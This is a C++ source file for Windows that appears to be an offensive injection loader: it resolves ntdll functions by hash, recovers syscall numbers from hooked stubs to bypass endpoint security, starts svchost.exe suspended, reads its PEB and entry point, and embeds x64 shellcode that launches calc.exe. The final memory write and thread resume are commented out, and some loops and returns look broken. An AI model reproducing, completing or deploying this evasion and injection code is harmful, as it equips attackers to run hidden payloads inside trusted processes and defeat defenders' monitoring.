#include <windows.h>
#include <stdio.h>
//#include <tchar.h>
#include <iostream>
#include <winternl.h>

#pragma comment(lib, "ntdll")
#define NtCurrentProcess()	   ((HANDLE)-1)

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#define UP -32
#define DOWN 32


typedef NTSTATUS(WINAPI* _NtWriteVirtualMemory)(
    HANDLE  ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten

    );

EXTERN_C VOID GetSyscall(WORD systemCall);
EXTERN_C VOID GetSyscall(WORD systemCall);
EXTERN_C VOID GetSyscallAddr(INT_PTR syscallAdr);

EXTERN_C NTSTATUS myNtGetContextThread(
    IN  HANDLE  ThreadHandle,
    OUT PCONTEXT    pContext

);

EXTERN_C NTSTATUS myNtReadVirtualMemory(
    IN  HANDLE  ProcessHandle,
    IN  LPCVOID   BaseAddress,
    OUT PVOID   Buffer,
    IN  ULONG   NumberOfBytesToRead,
    OUT SIZE_T  NumberOfBytesReaded OPTIONAL

);

EXTERN_C NTSTATUS myNtWriteVirtualMemory(
    IN  HANDLE  ProcessHandle,
    IN  PVOID   BaseAddress,
    IN  PVOID   Buffer,
    IN  ULONG   NumberOfBytesToWrite,
    OUT PULONG  NumberOfBytesWritten OPTIONAL



);

struct LDR_MODULE {
    LIST_ENTRY e[3];
    HMODULE base;
    void* entry;
    UINT size;
    UNICODE_STRING dllPath;
    UNICODE_STRING dllname;
};


DWORD calcHash(char* data) {
    DWORD hash = 0x99;
    for (int i = 0; i < strlen(data); i++) {
        hash += data[i] + (hash << 1);
    }
    return hash;
}

static DWORD calcHashModule(LDR_MODULE* mdll) {
    char name[64];
    size_t i = 0;

    while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1) {
        name[i] = (char)mdll->dllname.Buffer[i];
        i++;
    }
    name[i] = 0;
    return calcHash((char*)CharLowerA(name));
}

static HMODULE getModule(DWORD myHash) {
    HMODULE module;
    INT_PTR peb = __readgsqword(0x60);
    auto ldr = 0x18;
    auto flink = 0x10;

    auto Mldr = *(INT_PTR*)(peb + ldr);
    auto M1flink = *(INT_PTR*)(Mldr + flink);
    auto Mdl = (LDR_MODULE*)M1flink;
    do {
        Mdl = (LDR_MODULE*)Mdl->e[0].Flink;
        if (Mdl->base != NULL) {

            if (calcHashModule(Mdl) == myHash) {
                break;
            }
        }
    } while (M1flink != (INT_PTR)Mdl);

    module = (HMODULE)Mdl->base;
    return module;
}

static LPVOID getAPIAddr(HMODULE module, DWORD myHash) {

    PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)module + img_dos_header->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)module + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD fAddr = (PDWORD)((LPBYTE)module + img_edt->AddressOfFunctions);
    PDWORD fNames = (PDWORD)((LPBYTE)module + img_edt->AddressOfNames);
    PWORD  fOrd = (PWORD)((LPBYTE)module + img_edt->AddressOfNameOrdinals);

    for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
        LPSTR pFuncName = (LPSTR)((LPBYTE)module + fNames[i]);
        if (calcHash(pFuncName) == myHash) {
            return (LPVOID)((LPBYTE)module + fAddr[fOrd[i]]);
        }
    }
    return NULL;
}


WORD Unh00ksyscallNum(LPVOID addr) {


    WORD syscall = NULL;

    if (*((PBYTE)addr) == 0x4c
        && *((PBYTE)addr + 1) == 0x8b
        && *((PBYTE)addr + 2) == 0xd1
        && *((PBYTE)addr + 3) == 0xb8
        && *((PBYTE)addr + 6) == 0x00
        && *((PBYTE)addr + 7) == 0x00) {

        BYTE high = *((PBYTE)addr + 5);
        BYTE low = *((PBYTE)addr + 4);
        syscall = (high << 8) | low;

        return syscall;

    }

    if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 ||
        *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {

        for (WORD idx = 1; idx <= 500; idx++) {
            if (*((PBYTE)addr + idx * DOWN) == 0x4c
                && *((PBYTE)addr + 1 + idx * DOWN) == 0x8b
                && *((PBYTE)addr + 2 + idx * DOWN) == 0xd1
                && *((PBYTE)addr + 3 + idx * DOWN) == 0xb8
                && *((PBYTE)addr + 6 + idx * DOWN) == 0x00
                && *((PBYTE)addr + 7 + idx * DOWN) == 0x00) {
                BYTE high = *((PBYTE)addr + 5 + idx * DOWN);
                BYTE low = *((PBYTE)addr + 4 + idx * DOWN);
                syscall = (high << 8) | low - idx;

                return syscall;
            }
            if (*((PBYTE)addr + idx * UP) == 0x4c
                && *((PBYTE)addr + 1 + idx * UP) == 0x8b
                && *((PBYTE)addr + 2 + idx * UP) == 0xd1
                && *((PBYTE)addr + 3 + idx * UP) == 0xb8
                && *((PBYTE)addr + 6 + idx * UP) == 0x00
                && *((PBYTE)addr + 7 + idx * UP) == 0x00) {
                BYTE high = *((PBYTE)addr + 5 + idx * UP);
                BYTE low = *((PBYTE)addr + 4 + idx * UP);
                syscall = (high << 8) | low + idx;

                return syscall;

            }

        }

    }
}


INT_PTR Unh00ksyscallInstr(LPVOID addr) {


    WORD syscall = NULL;

    if (*((PBYTE)addr) == 0x4c
        && *((PBYTE)addr + 1) == 0x8b
        && *((PBYTE)addr + 2) == 0xd1
        && *((PBYTE)addr + 3) == 0xb8
        && *((PBYTE)addr + 6) == 0x00
        && *((PBYTE)addr + 7) == 0x00) {

        return (INT_PTR)addr + 0x12;    // syscall

    }

    if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 ||
        *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {

        for (WORD idx = 1; idx <= 500; idx++) {
            if (*((PBYTE)addr + idx * DOWN) == 0x4c
                && *((PBYTE)addr + 1 + idx * DOWN) == 0x8b
                && *((PBYTE)addr + 2 + idx * DOWN) == 0xd1
                && *((PBYTE)addr + 3 + idx * DOWN) == 0xb8
                && *((PBYTE)addr + 6 + idx * DOWN) == 0x00
                && *((PBYTE)addr + 7 + idx * DOWN) == 0x00) {

                return (INT_PTR)addr + 0x12;
            }
            if (*((PBYTE)addr + idx * UP) == 0x4c
                && *((PBYTE)addr + 1 + idx * UP) == 0x8b
                && *((PBYTE)addr + 2 + idx * UP) == 0xd1
                && *((PBYTE)addr + 3 + idx * UP) == 0xb8
                && *((PBYTE)addr + 6 + idx * UP) == 0x00
                && *((PBYTE)addr + 7 + idx * UP) == 0x00) {

                return (INT_PTR)addr + 0x12;

            }

        }

    }

}


int main()
{
        //python GetHash.py ntdll.dll
        HMODULE mod = getModule(4097367);

        unsigned char buf[] =
            "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
            "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
            "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
            "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
            "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
            "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
            "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
            "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
            "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
            "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
            "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
            "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
            "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
            "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
            "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
            "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
            "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
            "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
            "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
            "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

        STARTUPINFOA si;
        PROCESS_INFORMATION pi;

        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));

        // Start the child process.
        if (!CreateProcessA(NULL,   // No module name (use command line)
            (LPSTR)"C:\\Windows\\system32\\svchost.exe",        // Command line
            NULL,           // Process handle not inheritable
            NULL,           // Thread handle not inheritable
            FALSE,          // Set handle inheritance to FALSE
            CREATE_SUSPENDED,              // No creation flags
            NULL,           // Use parent's environment block
            NULL,           // Use parent's starting directory
            &si,            // Pointer to STARTUPINFO structure
            &pi)           // Pointer to PROCESS_INFORMATION structure
            )
        {
            printf("CreateProcess failed (%d).\n", GetLastError());
            return 1;
        }




        printf("PPID: %d\n", GetCurrentProcessId());
        printf("PID: %d\n", pi.dwProcessId);

        // Get the child process' context - NtGetContextThread

        LPVOID addr = NULL;
        WORD syscallNum = NULL;
        INT_PTR syscallAddr = NULL;

        CONTEXT ctx;
        memset(&ctx, 0, sizeof(ctx));
        ctx.ContextFlags = CONTEXT_FULL;

        addr = getAPIAddr(mod, 76093572262); //NtGetContextThread
        syscallNum = Unh00ksyscallNum(addr);
        syscallAddr = Unh00ksyscallInstr(addr);

        GetSyscall(syscallNum);
        GetSyscallAddr(syscallAddr);

        NTSTATUS  status1 = myNtGetContextThread(pi.hThread, &ctx);

        if (status1)
        {
            std::cout << "myNtGetContextThread failed: " << GetLastError() << std::endl;

        }
      

        // Read the PEB address from the context
        DWORD_PTR pebAddress = ctx.Rdx;

        // Read the PEB structure from the child process
        PEB peb;
        memset(&peb, 0, sizeof(peb));
        SIZE_T bytesRead = NULL;


        addr = getAPIAddr(mod, 228701921503); //NtReadVirtualMemory
        syscallNum = Unh00ksyscallNum(addr);
        syscallAddr = Unh00ksyscallInstr(addr);

        GetSyscall(syscallNum);
        GetSyscallAddr(syscallAddr);

        NTSTATUS status2 = myNtReadVirtualMemory(pi.hProcess, (LPCVOID)pebAddress, &peb, sizeof(peb), bytesRead);
       
        if (status2)
        {
            std::cout << "myNtReadVirtualMemory1 failed: " << GetLastError() << std::endl;

        }
        
    
        std::cout << "Peb address: 0x" << std::hex << pebAddress << std::endl;
        DWORD_PTR imageBaseAddress = pebAddress + 0x010;
        std::cout << "ImageBaseAddress address: 0x" << std::hex << imageBaseAddress << std::endl;

        DWORD_PTR imageBaseValue = 0;
        SIZE_T bytesReadAgain = NULL;

        NTSTATUS status3 = myNtReadVirtualMemory(pi.hProcess, (LPCVOID)imageBaseAddress, &imageBaseValue, sizeof(imageBaseValue), bytesReadAgain);

        if (status3)
        {
            std::cout << "myNtReadVirtualMemory2 failed: " << GetLastError() << std::endl;

        }   


       
        std::cout << "ImageBaseAddress value: 0x" << std::hex << imageBaseValue << std::endl;

        // read target process image headers
        BYTE headersBuffer[4096] = {};
        

        NTSTATUS status4 = myNtReadVirtualMemory(pi.hProcess, (LPCVOID)imageBaseValue, headersBuffer, 4096, NULL);

        if (status4)
        {
            std::cout << "myNtReadVirtualMemory3 failed: " << GetLastError() << std::endl;

        }
        

        // get AddressOfEntryPoint
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
        PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
        LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)imageBaseValue);
        std::cout << "AddressOfEntryPoint value: 0x" << std::hex << (DWORD_PTR)codeEntry << std::endl;



        // write buf to image entry point and execute it

        addr = getAPIAddr(mod, 687514600120); //NtWriteVirtualMemory
        syscallNum = Unh00ksyscallNum(addr);
        syscallAddr = Unh00ksyscallInstr(addr);

        GetSyscall(syscallNum);
        GetSyscallAddr(syscallAddr);

        //WriteProcessMemory(pi.hProcess, codeEntry, buf, sizeof(buf), NULL);

       // NTSTATUS status5 = myNtWriteVirtualMemory(pi.hProcess, (PVOID)codeEntry, (PVOID)buf, (ULONG)(sizeof(buf)), NULL);
        /*
        if (status5)
        {
            std::cout << "myNtWriteVirtualMemory failed: " << GetLastError() << std::endl;

        }
        */

        /*
        _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");

        NtWriteVirtualMemory(pi.hProcess, codeEntry, buf, sizeof(buf), NULL);
        
        */
        //ResumeThread(pi.hThread);




        return 0;
    }





